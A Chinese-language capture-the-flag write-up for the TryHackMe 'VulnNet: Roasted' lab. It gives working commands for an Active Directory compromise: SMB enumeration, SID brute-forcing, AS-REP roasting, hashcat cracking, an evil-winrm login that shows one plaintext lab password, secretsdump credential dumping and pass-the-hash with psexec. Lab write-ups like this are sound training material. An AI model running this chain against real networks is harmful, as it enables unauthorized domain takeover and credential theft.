# VulnNet: Roasted

VulnNet Entertainment刚刚与新雇用的系统管理员一起在其网络上部署了一个新实例。作为一家具有安全意识的公司，他们一如既往地聘请您执行渗透测试，并查看系统管理员的表现。

---

## 端口扫描

循例nmap 扫: nmap -sS 10.10.26.181 -p 1-10000 -T5

    53/tcp   open  domain
    88/tcp   open  kerberos-sec
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl
    5985/tcp open  wsman
    9389/tcp open  adws

## smb枚举

枚举smb
    
    enum4linux -M -U -S 10.10.26.181

获得信息：

    Domain Name: VULNNET-RST
    Domain Sid: S-1-5-21-1589833671-435344116-4136949213

枚举smb共享文件夹：

    smbclient -L 10.10.26.181

    VulnNet-Business-Anonymous   Disk      VulnNet Business Sharing
    VulnNet-Enterprise-Anonymous   Disk      VulnNet Enterprise Sharing

使用smbclient分别进入两个文件夹，会得到六个文本文件

有四个文件披露了四个可能的用户名

## msrpc sid爆破

但我们有更好的选择，我们可以使用lookupsid.py，通过msrpc sid爆破列举出存在的用户和组：

    python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymouse@10.10.26.181 | grep SidTypeUser

清洗一下数据，提取用户名，将其保存到文件

## AS-REP roasting

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile ./test1.txt -dc-ip 10.10.26.181 -no-pass -request VULNNET-RST/

我们将获得 t-skid 的密码hash

如果你细心阅读我们一开始在smb共享获取的那六个文本文件，你就会发现有一个文件中披露了：

    Tony Skid 是一名核心安全经理，负责内部基础设施。
    我们确保您的数据安全和私密。在保护您的私人信息方面...
    我们把它锁得比恶魔岛更紧。
    我们与TryHackMe合作，使用128位SSL加密，并创建每日备份。
    未经您的许可，我们绝不会向第三方披露任何数据。
    放心吧，没有什么能活着离开这里。

我想的应该没错

言归正传，我们将我们获得的密码hash保存到文件，并使用hashcat尝试爆破:

    hashcat -a 0 -m 18200 ./hash /usr/share/wordlists/rockyou.txt

## 旋转-再次smb枚举

我们爆破获得了t-skid的明文密码，我们使用该账户再次进行smb枚举

    smbclient //10.10.244.32/NETLOGON/ -U VULNNET-RST/t-skid

    smb: \> get ResetPassword.vbs 

发现凭据：

    strUserNTName = "a-whitehat"
    strPassword = "**********"

## 横向移动

我们尝试再次查看smbNETLOGIN，发现这个账户登不上，那我们尝试通过psexec获得cmd会话，失败，可能是网络原因，发现总是丢包

目标开启了5985端口，再尝试通过winrm

    evil-winrm -i 10.10.244.32 -u a-whitehat -p bNdKVkjv3RR9ht

尝试了许多遍，连上了

    C:\Users\enterprise-core-vn\desktop> type user.txt

## 远程转储凭据

卡死我了，我选择放弃使用远程命令行，让secretsdump.py来帮我完成吧

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py VULNNET-RST/a-whitehat@10.10.244.32

最后我们将获得administrator的ntlm hash，我们没有必要破解，因为我们可以进行进行pth

例如：psexec.py、evil-winrm

    python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes **********:********* Administrator@10.10.244.32

system.txt在桌面下
